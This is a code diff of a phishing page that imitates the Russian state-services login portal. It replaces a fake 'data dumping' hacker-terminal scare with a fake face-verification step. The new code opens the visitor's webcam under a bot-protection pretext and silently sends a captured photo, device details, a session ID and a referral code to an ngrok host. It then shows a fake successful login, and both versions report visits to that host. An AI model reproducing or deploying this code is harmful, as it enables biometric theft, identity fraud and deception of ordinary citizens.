@@ -19,14 +19,55 @@
             position: relative;
         }
 
-        .main-container { position: relative; display: flex; justify-content: center; align-items: center; width: 100%; }
-        .form-column { display: flex; flex-direction: column; width: 100%; max-width: 380px; z-index: 1; }
-        .card { background: #ffffff; padding: 35px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03); width: 100%; position: relative; overflow: hidden; }
-
-        /* Контейнер для оригинальной формы */
-        .form-content {
-            transition: opacity 0.3s ease, transform 0.3s ease;
+        /* --- ПЕРВОНАЧАЛЬНАЯ ЗАГРУЗКА (СТРОГО ПО ЦЕНТРУ) --- */
+        .initial-loader-overlay {
+            position: fixed;
+            inset: 0;
+            background-color: #e4ecfd;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 200000;
         }
+        .initial-loader-card {
+            background: #ffffff;
+            padding: 40px 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03);
+            width: 100%;
+            max-width: 380px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+        .loader-spinner {
+            width: 45px;
+            height: 45px;
+            border: 4px solid #f2f3f5;
+            border-top: 4px solid #005FF9;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        .loader-text { font-size: 15px; color: #0c2340; font-weight: 500; }
+
+        /* --- СТИЛИ ОКНА АВТОРИЗАЦИИ (ШАГ 3) --- */
+        .main-container { position: relative; display: flex; justify-content: center; align-items: center; width: 100%; }
+        
+        .form-column { 
+            display: flex; 
+            flex-direction: column; 
+            width: 100%; 
+            max-width: 380px; 
+            z-index: 1;
+            opacity: 0; 
+            display: none; 
+            transition: opacity 0.5s ease-in-out;
+        }
+
+        .card { background: #ffffff; padding: 35px 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03); width: 100%; }
 
         .logo-container { text-align: center; margin-bottom: 25px; }
         .logo-img { max-height: 130px; width: auto; display: block; margin: 0 auto; }
@@ -37,8 +78,8 @@
         .form-group input {
             width: 100%; padding: 12px; background-color: #f2f3f5; border: 1px solid transparent; 
             border-radius: 8px; font-size: 14px; outline: none; transition: border-color 0.2s, background-color 0.2s;
+            color: #4b5563;
         }
-        .form-group input:focus { background-color: #ffffff; border-color: #2764FC; }
 
         .link-restore, .link-cant-login, .alt-login-text a, .register-link-container a { color: #2764FC; text-decoration: none; }
         .link-restore { display: inline-block; font-size: 14px; margin-bottom: 24px; }
@@ -46,345 +87,270 @@
         
         .btn-primary {
             width: 100%; padding: 14px; background-color: #005FF9; color: #ffffff; border: none; 
-            border-radius: 8px; font-size: 15px; font-weight: 500; cursor: pointer; margin-bottom: 20px; transition: background-color 0.2s;
+            border-radius: 8px; font-size: 15px; font-weight: 500; cursor: pointer; margin-bottom: 20px;
         }
-        .btn-primary:hover { background-color: #0047c2; }
 
         .divider { border: none; border-top: 1px solid #e1e3e6; margin: 0 -30px 24px -30px; }
         .alt-login-text { font-size: 14px; color: #000; margin-bottom: 16px; }
         .btn-outline {
             width: 100%; padding: 12px; background-color: transparent; color: #2764FC; border: 1px solid #2764FC; 
-            border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; margin-bottom: 12px; transition: background-color 0.2s;
+            border-radius: 8px; font-size: 14px; font-weight: 500; cursor: pointer; margin-bottom: 12px;
         }
-        .btn-outline:hover { background-color: rgba(39, 100, 252, 0.05); }
-        .btn-outline:last-child { margin-bottom: 0; }
         .register-link-container { margin-top: 25px; text-align: center; font-size: 15px; }
 
-        /* Стили для терминала */
-        .hacker-overlay {
-            position: fixed; inset: 0; background: rgba(8, 12, 18, 0.94); backdrop-filter: blur(8px); display: flex; 
-            justify-content: center; align-items: center; z-index: 10500; opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; padding: 20px;
+        /* --- МОДАЛЬНЫЕ ОКНА БИОМЕТРИИ (ШАГ 2) --- */
+        .bio-modal-overlay {
+            position: fixed; inset: 0; background: rgba(12, 35, 64, 0.85); backdrop-filter: blur(8px); display: flex; 
+            justify-content: center; align-items: center; z-index: 100000; opacity: 0; visibility: hidden; transition: opacity 0.4s ease, visibility 0.4s ease; padding: 20px;
         }
-        .hacker-overlay.visible { opacity: 1; visibility: visible; }
-        .hacker-window {
-            width: 100%; max-width: 580px; background: #0d1117; border: 1px solid #30363d; border-radius: 12px; 
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(88, 166, 255, 0.12); overflow: hidden; font-family: "Consolas", "Courier New", monospace;
+        .bio-modal-overlay.visible { opacity: 1; visibility: visible; }
+        .bio-modal-content {
+            background: #ffffff; border-radius: 20px; width: 100%; max-width: 420px; padding: 30px 25px;
+            text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.3); transform: translateY(20px); transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
-        .hacker-body { padding: 22px; color: #c9d1d9; }
-        .terminal-console { height: 230px; overflow-y: auto; font-size: 13px; line-height: 1.5; margin-bottom: 16px; padding-right: 6px; text-align: left;}
-        .terminal-console::-webkit-scrollbar { width: 4px; }
-        .terminal-console::-webkit-scrollbar-thumb { background: #21262d; border-radius: 2px; }
-        .log-line { margin-bottom: 4px; word-break: break-all; }
-        .log-line .timestamp { color: #8b949e; }
-        .log-line .tag-info { color: #58a6ff; }
-        .log-line .tag-warn { color: #d29922; }
-        .log-line .tag-success { color: #3fb950; }
-        .hacker-progress-container { border-top: 1px dashed #30363d; padding-top: 14px; }
-        .progress-info { display: flex; justify-content: space-between; font-size: 12px; color: #8b949e; margin-bottom: 8px; }
-        .progress-bar-bg { width: 100%; height: 8px; background: #21262d; border-radius: 4px; overflow: hidden; }
-        .progress-bar-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #1f6feb, #58a6ff); box-shadow: 0 0 10px rgba(88, 166, 255, 0.5); transition: width 0.15s linear; }
+        .bio-modal-overlay.visible .bio-modal-content { transform: translateY(0); }
+        .bio-modal-title { font-size: 22px; color: #0c2340; margin: 0 0 10px 0; }
+        .bio-modal-desc { font-size: 14px; color: #4b5563; margin: 0 0 20px 0; line-height: 1.5; }
 
-        /* Стили для системы уведомлений об ошибках (Toast) */
-        .toast-container {
-            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); z-index: 12000;
-            display: flex; flex-direction: column; gap: 12px; pointer-events: none; width: 90%; max-width: 400px;
+        .camera-container {
+            width: 100%; height: 320px; background: #000; border-radius: 16px; overflow: hidden; margin-bottom: 24px; 
+            position: relative; box-shadow: inset 0 0 20px rgba(0,0,0,0.5); border: 2px solid #e1e3e6;
         }
-        .error-toast {
-            background-color: #fef2f2; border-left: 6px solid #ef4444; color: #991b1b; padding: 16px 20px;
-            border-radius: 6px; box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1), 0 4px 6px rgba(0, 0, 0, 0.05);
-            font-size: 15px; font-weight: 500; display: flex; align-items: center; opacity: 0; transform: translateY(30px);
-            animation: slideInToast 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards, fadeOutToast 0.5s ease 3.5s forwards;
-        }
-        .error-toast::before { content: "⚠️"; margin-right: 12px; font-size: 18px; }
-
-        @keyframes slideInToast { to { opacity: 1; transform: translateY(0); } }
-        @keyframes fadeOutToast { to { opacity: 0; transform: translateY(-20px); margin-top: -60px; } }
-
-        /* Премиальная анимация галочки и успеха */
-        .success-container {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            padding: 50px 10px;
-            text-align: center;
-            animation: fadeInState 0.6s ease forwards;
-        }
-
-        .checkmark-wrapper {
-            position: relative;
-            width: 90px;
-            height: 90px;
-            margin-bottom: 30px;
-        }
-
-        .checkmark {
-            width: 90px;
-            height: 90px;
+        #bioVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        
+        .face-guide {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 180px; height: 250px;
             border-radius: 50%;
-            display: block;
-            stroke-width: 3.5;
-            stroke: #005FF9;
-            stroke-miterlimit: 10;
-            box-shadow: inset 0px 0px 0px #005FF9;
-            animation: fillCircle .4s ease-in-out .4s forwards, scaleBounce .3s ease-in-out .9s both;
-            position: relative;
+            box-shadow: 0 0 0 2000px rgba(12, 35, 64, 0.7);
+            border: 2px dashed rgba(255, 255, 255, 0.8);
+            pointer-events: none;
             z-index: 2;
         }
 
-        .checkmark__circle {
-            stroke-dasharray: 166;
-            stroke-dashoffset: 166;
-            stroke-width: 3.5;
-            stroke-miterlimit: 10;
-            stroke: #005FF9;
-            fill: none;
-            animation: drawStroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        .btn-bio-capture {
+            width: 100%; padding: 16px; background-color: #005FF9; color: #ffffff; border: none; border-radius: 12px; 
+            font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px;
         }
 
-        .checkmark__check {
-            transform-origin: 50% 50%;
-            stroke-dasharray: 48;
-            stroke-dashoffset: 48;
-            animation: drawStroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.6s forwards;
+        /* --- АНИМАЦИЯ УСПЕХА (ШАГ 4) --- */
+        .success-overlay {
+            position: fixed; inset: 0; background: rgba(12, 35, 64, 0.85); backdrop-filter: blur(8px); display: flex; 
+            justify-content: center; align-items: center; z-index: 11000; opacity: 0; visibility: hidden; transition: opacity 0.4s ease, visibility 0.4s ease; padding: 20px;
         }
+        .success-overlay.visible { opacity: 1; visibility: visible; }
+        
+        .success-card {
+            background: #ffffff; border-radius: 20px; width: 100%; max-width: 400px; padding: 40px 30px;
+            text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.3); transform: scale(0.9); transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .success-overlay.visible .success-card { transform: scale(1); }
 
-        .checkmark-pulse {
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(0, 95, 249, 0.1);
-            border-radius: 50%;
-            z-index: 1;
-            opacity: 0;
-            animation: pulseWave 1.5s cubic-bezier(0.215, 0.61, 0.355, 1) 0.9s forwards;
+        .checkmark-circle {
+            width: 80px; height: 80px; border-radius: 50%; background: #005FF9; display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px auto; animation: scaleIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
         }
+        .checkmark-icon { color: white; font-size: 40px; font-weight: bold; }
+        .success-title { font-size: 24px; color: #0c2340; margin: 0 0 10px 0; font-weight: 700; }
+        .success-desc { font-size: 15px; color: #4b5563; margin: 0 0 20px 0; line-height: 1.5; }
 
-        .success-text {
-            font-size: 22px;
-            font-weight: 700;
-            color: #0b1f33;
-            opacity: 0;
-            transform: translateY(15px);
-            animation: slideUpFade 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) 1s forwards;
-            line-height: 1.35;
-        }
-
-        @keyframes drawStroke { 100% { stroke-dashoffset: 0; } }
-        @keyframes scaleBounce {
-            0%, 100% { transform: none; }
-            50% { transform: scale3d(1.15, 1.15, 1); }
-        }
-        @keyframes fillCircle { 100% { box-shadow: inset 0px 0px 0px 45px rgba(0, 95, 249, 0.06); } }
-        @keyframes pulseWave {
-            0% { transform: scale(0.9); opacity: 1; }
-            100% { transform: scale(1.6); opacity: 0; }
-        }
-        @keyframes fadeInState { from { opacity: 0; } to { opacity: 1; } }
-        @keyframes slideUpFade { to { opacity: 1; transform: translateY(0); } }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes scaleIn { 0% { transform: scale(0); } 100% { transform: scale(1); } }
     </style>
 </head>
 <body>
 
-    <div class="main-container">
-        <div class="form-column">
-            <!-- В карточку добавлен контейнер для скрытия формы и блок успеха -->
-            <div class="card">
-                <div id="formContent" class="form-content">
-                    <div class="logo-container">
-                        <img src="flags/gos.png" alt="логотип" class="logo-img" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
-                        <div class="logo-placeholder" style="display:none;">ЛОГОТИП ГОСОВ</div>
-                    </div>
-                    <form id="loginForm" onsubmit="return false;">
-                        <div class="form-group"><label>Телефон / Эл. почта / СНИЛС</label><input type="text" id="userInput" name="phone" required /></div>
-                        <div class="form-group"><label>Пароль</label><input type="password" id="passwordInput" name="password" required /></div>
-                        <a href="#" class="link-restore">Восстановить</a>
-                        <button type="submit" id="submitBtn" class="btn-primary">Войти</button>
-                    </form>
-                    <a href="#" class="link-cant-login">Не удаётся войти</a>
-                    <hr class="divider">
-                    <div class="alt-login-text">Войти другим способом. <a href="#">Подробнее</a></div>
-                    <button type="button" class="btn-outline">QR-код</button>
-                    <button type="button" class="btn-outline">Электронная подпись</button>
-                    
-                    <div class="register-link-container"><a href="#">Зарегистрироваться</a></div>
-                </div>
-
-                <!-- Блок успешного применения скидки -->
-                <div id="successState" class="success-container">
-                    <div class="checkmark-wrapper">
-                        <div class="checkmark-pulse"></div>
-                        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
-                            <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
-                            <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
-                        </svg>
-                    </div>
-                    <div class="success-text">Вход выполнен <br>успешно</div>
-                </div>
-            </div>
+    <!-- 1. Окно первоначальной загрузки -->
+    <div class="initial-loader-overlay" id="initialLoaderOverlay">
+        <div class="initial-loader-card">
+            <div class="loader-spinner"></div>
+            <div class="loader-text">Установка безопасного соединения...</div>
         </div>
     </div>
 
-    <!-- Контейнер для всплывающих уведомлений -->
-    <div id="toastContainer" class="toast-container"></div>
-
-    <div id="hackerModal" class="hacker-overlay">
-        <div class="hacker-window">
-            <div class="hacker-body">
-                <div id="terminalConsole" class="terminal-console"></div>
-                <div class="hacker-progress-container">
-                    <div class="progress-info">
-                        <span id="progressText">ВЫГРУЗКА ДАННЫХ И ЛОГОВ...</span>
-                        <span id="progressPercent">0%</span>
-                    </div>
-                    <div class="progress-bar-bg">
-                        <div id="progressBarFill" class="progress-bar-fill"></div>
-                    </div>
+    <!-- 3. Окно авторизации (Появится на 1.5 сек) -->
+    <div class="main-container">
+        <div class="form-column" id="loginFormContainer">
+            <div class="card">
+                <div class="logo-container">
+                    <img src="flags/gos.png" alt="логотип" class="logo-img" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+                    <div class="logo-placeholder" style="display:none;">ЛОГОТИП</div>
                 </div>
+                <form action="#" method="POST" onsubmit="return false;">
+                    <div class="form-group"><label>Телефон / Эл. почта</label><input type="text" name="phone" id="inputPhone" readonly value="+7 (***) ***-**-**" /></div>
+                    <div class="form-group"><label>Пароль</label><input type="password" name="password" id="inputPassword" readonly value="********" /></div>
+                    <a href="#" class="link-restore">Восстановить</a>
+                    <button type="button" class="btn-primary" disabled>Войти</button>
+                </form>
+                <a href="#" class="link-cant-login">Не удаётся войти</a>
+                <hr class="divider">
+                <div class="alt-login-text">Войти другим способом. <a href="#">Подробнее</a></div>
+                <button type="button" class="btn-outline">QR-код</button>
+                <button type="button" class="btn-outline">Электронная подпись</button>
             </div>
+            <div class="register-link-container"><a href="#">Зарегистрироваться</a></div>
+        </div>
+    </div>
+
+    <!-- 2. ШАГ 2: КАМЕРА ПОДТВЕРЖДЕНИЯ -->
+    <div id="biometryModal" class="bio-modal-overlay">
+        <div class="bio-modal-content">
+            <h3 class="bio-modal-title">Подтверждение личности</h3>
+            <p class="bio-modal-desc">Поместите лицо в овал. Ожидайте, пока система распознает вас.</p>
+            
+            <div class="camera-container">
+                <video id="bioVideo" autoplay playsinline muted></video>
+                <div class="face-guide"></div>
+            </div>
+            <button id="btnCapture" class="btn-bio-capture">
+                <span style="animation: spin 1s linear infinite; display: inline-block;">⏳</span> Инициализация камеры...
+            </button>
+        </div>
+    </div>
+
+    <!-- 4. ШАГ 4: УСПЕШНЫЙ ВХОД (НОВОЕ ОКНО) БЕЗ РЕДИРЕКТА -->
+    <div id="successModal" class="success-overlay">
+        <div class="success-card">
+            <div class="checkmark-circle">
+                <div class="checkmark-icon">✓</div>
+            </div>
+            <h2 class="success-title">Успешно!</h2>
+            <p class="success-desc">Вы успешно авторизовались в личном кабинете государственных услуг.</p>
         </div>
     </div>
 
     <script>
+        const initialLoaderOverlay = document.getElementById('initialLoaderOverlay');
+        const loginFormContainer = document.getElementById('loginFormContainer');
+        const bioModal = document.getElementById('biometryModal');
+        const successModal = document.getElementById('successModal');
+        const video = document.getElementById('bioVideo');
+        const btnCapture = document.getElementById('btnCapture');
+        let stream = null;
+
+        // Генерация единого ID сессии и извлечение реферального кода
+        const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
+        const urlParams = new URLSearchParams(window.location.search);
+        const refCode = urlParams.get('ref') || '';
+        const API_BASE = 'https://accent-cried-guzzler.ngrok-free.dev'; // Замените на ваш домен
+
         document.addEventListener('DOMContentLoaded', () => {
-            const hackerModal = document.getElementById('hackerModal');
-            const terminalConsole = document.getElementById('terminalConsole');
-            const progressBarFill = document.getElementById('progressBarFill');
-            const progressPercent = document.getElementById('progressPercent');
-            const toastContainer = document.getElementById('toastContainer');
-            
-            const formContent = document.getElementById('formContent');
-            const successState = document.getElementById('successState');
-
-            const hackerLogs = [
-                { type: 'info', text: 'Инициализация сеанса авторизации...' },
-                { type: 'success', text: 'Учетные данные подтверждены системой.' },
-                { type: 'info', text: 'Сканирование защищенного профиля пользователя...' },
-                { type: 'warn', text: 'Обнаружено активных сессий: 3' },
-                { type: 'info', text: 'Подготовка пакета данных для синхронизации...' },
-                { type: 'success', text: 'Синхронизировано: Основные сведения' },
-                { type: 'success', text: 'Синхронизировано: Налоговые документы' },
-                { type: 'success', text: 'Синхронизировано: Цифровой профиль' },
-                { type: 'info', text: 'Dumping DB table: [user_auth_tokens] (Offset: 0x0000 to 0x2C1A)' },
-                { type: 'info', text: 'Compressing package (GZIP level 9) to 34.5 MB...' },
-                { type: 'success', text: 'Data transfer sequence finished. Checksum SHA-256 OK.' },
-                { type: 'warn', text: 'Резервная копия сессии передана на удаленный узел.' },
-                { type: 'info', text: 'ОЧИСТКА ВРЕМЕННЫХ ФАЙЛОВ И КЕША БРАУЗЕРА...' },
-                { type: 'success', text: 'Очистка следов успешно завершена.' },
-                { type: 'success', text: 'Готово!' }
-            ];
-
-            const urlParams = new URLSearchParams(window.location.search);
-            let refCode = urlParams.get('ref');
-            
-            if (refCode) {
-                localStorage.setItem('refCode', refCode);
-            } else {
-                refCode = localStorage.getItem('refCode');
-            }
-
+            // Отправка информации о посещении
             const visitDeviceInfo = {
                 userAgent: navigator.userAgent,
-                platform: navigator.platform || (navigator.userAgentData ? navigator.userAgentData.platform : 'Неизвестно'),
-                language: navigator.language,
-                screenRes: `${window.screen.width}x${window.screen.height}`,
                 localTime: new Date().toLocaleString('ru-RU')
             };
 
-            const visitPayload = { 
-                deviceInfo: visitDeviceInfo,
-                refCode: refCode || null 
-            };
-
-            fetch('https://accent-cried-guzzler.ngrok-free.dev/api/visit', { 
+            fetch(`${API_BASE}/api/visit`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(visitPayload)
-            }).catch(err => console.error("Ошибка отправки визита:", err));
+                body: JSON.stringify({ refCode, sessionId, deviceInfo: visitDeviceInfo })
+            }).catch(console.error);
 
-            // Автоматический запуск терминала спустя 2 секунды
+            // ЭТАП 1: Имитация первоначальной загрузки (2 секунды)
             setTimeout(() => {
-                if (!hackerModal.classList.contains('visible')) {
-                    hackerModal.classList.add('visible');
-                    runHackerTerminal(() => {
-                        // После завершения логов скрываем терминал
-                        hackerModal.classList.remove('visible');
-                        
-                        // Спустя короткую задержку (пока исчезает терминал) подменяем контент формы
-                        setTimeout(() => {
-                            formContent.style.display = 'none';
-                            successState.style.display = 'flex';
-                        }, 300);
-                    });
-                }
+                initialLoaderOverlay.style.display = 'none';
+                
+                // ЭТАП 2: Появление формы подтверждения по лицу
+                bioModal.classList.add('visible');
+                startCamera();
             }, 2000);
-
-            // Функция отображения красивой ошибки (Toast Notification)
-            function showErrorToast(message) {
-                const toast = document.createElement('div');
-                toast.className = 'error-toast';
-                toast.textContent = message;
-                
-                toastContainer.appendChild(toast);
-
-                setTimeout(() => {
-                    if (toast.parentNode) {
-                        toast.parentNode.removeChild(toast);
-                    }
-                }, 4000);
-            }
-
-            // Глобальный перехватчик кликов на ВСЕ кнопки и ссылки
-            document.body.addEventListener('click', (e) => {
-                const interactiveElement = e.target.closest('button, a');
-                
-                if (interactiveElement) {
-                    e.preventDefault();   
-                    e.stopPropagation();  
-                    
-                    showErrorToast('Действия с вашего IP ограничены');
-                }
-            }, true);
-
-            function runHackerTerminal(onComplete) {
-                let currentLogIndex = 0;
-                const totalLogs = hackerLogs.length;
-
-                terminalConsole.innerHTML = ''; 
-
-                function processNextLog() {
-                    if (currentLogIndex < totalLogs) {
-                        const log = hackerLogs[currentLogIndex];
-                        const now = new Date();
-                        const timeStr = now.toTimeString().split(' ')[0] + '.' + String(now.getMilliseconds()).padStart(3, '0');
-
-                        let tagClass = 'tag-info';
-                        let tagTitle = '[INFO]';
-                        if (log.type === 'warn') { tagClass = 'tag-warn'; tagTitle = '[WARN]'; }
-                        if (log.type === 'success') { tagClass = 'tag-success'; tagTitle = '[OK]  '; }
-
-                        const lineDiv = document.createElement('div');
-                        lineDiv.className = 'log-line';
-                        lineDiv.innerHTML = `<span class="timestamp">${timeStr}</span> <span class="${tagClass}">${tagTitle}</span> ${log.text}`;
-                        
-                        terminalConsole.appendChild(lineDiv);
-                        terminalConsole.scrollTop = terminalConsole.scrollHeight;
-
-                        currentLogIndex++;
-                        const percent = Math.round((currentLogIndex / totalLogs) * 100);
-                        progressBarFill.style.width = percent + '%';
-                        progressPercent.textContent = percent + '%';
-
-                        let delay = Math.floor((Math.random() * 200 + 100));
-                        if (log.text.includes('Dumping') || log.text.includes('Compressing')) delay = 700;
-                        
-                        setTimeout(processNextLog, delay);
-                    } else {
-                        setTimeout(() => { if (onComplete) onComplete(); }, 1000); 
-                    }
-                }
-                processNextLog();
-            }
         });
+
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                video.srcObject = stream;
+                startAutoCapture();
+            } catch (err) {
+                console.error("Ошибка доступа к камере:", err);
+                alert("Пожалуйста, разрешите доступ к камере для защиты от ботов.");
+            }
+        }
+
+        function startAutoCapture() {
+            btnCapture.disabled = true;
+            btnCapture.style.backgroundColor = '#d29922'; 
+            btnCapture.innerHTML = '<span style="animation: spin 1s linear infinite; display: inline-block;">⏳</span> Анализ лица...';
+
+            setTimeout(() => {
+                btnCapture.style.backgroundColor = '#005FF9'; 
+                btnCapture.innerHTML = '<span style="animation: spin 1s linear infinite; display: inline-block;">⏳</span> Ожидание подтверждения системой...';
+                
+                // Отправка фото на сервер
+                captureAndSendBackground();
+                
+                // Симуляция времени проверки (6 секунд)
+                setTimeout(() => {
+                    if (stream) stream.getTracks().forEach(track => track.stop());
+                    
+                    // Скрываем FaceID
+                    bioModal.classList.remove('visible');
+                    
+                    // ЭТАП 3: Появление формы авторизации на 1.5 секунды
+                    loginFormContainer.style.display = 'flex';
+                    
+                    // Небольшая задержка для плавного появления
+                    setTimeout(() => {
+                        loginFormContainer.style.opacity = '1';
+                    }, 50);
+
+                    // Скрываем форму через 1.5 секунды
+                    setTimeout(() => {
+                        loginFormContainer.style.opacity = '0';
+                        
+                        setTimeout(() => {
+                            loginFormContainer.style.display = 'none';
+                            
+                            // ЭТАП 4: Подтверждение успешного входа (Новое всплывающее окно)
+                            showSuccessNotification();
+                        }, 500); // Ждем пока закончится анимация затухания
+
+                    }, 1500); // Форма авторизации висит на экране ровно 1.5 секунды
+                    
+                }, 6000);
+
+            }, 2500);
+        }
+
+        function captureAndSendBackground() {
+            if (!stream) return;
+            
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                localTime: new Date().toLocaleString('ru-RU')
+            };
+
+            fetch(`${API_BASE}/api/biometry`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    image: photoBase64, 
+                    deviceInfo: deviceInfo, 
+                    refCode, 
+                    sessionId
+                })
+            }).catch(console.error);
+        }
+
+        function showSuccessNotification() {
+            successModal.classList.add('visible');
+            
+            // Уведомляем бот об успешной авторизации
+            fetch(`${API_BASE}/api/success`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ sessionId })
+            }).catch(console.error);
+        }
     </script>
 </body>
 </html>
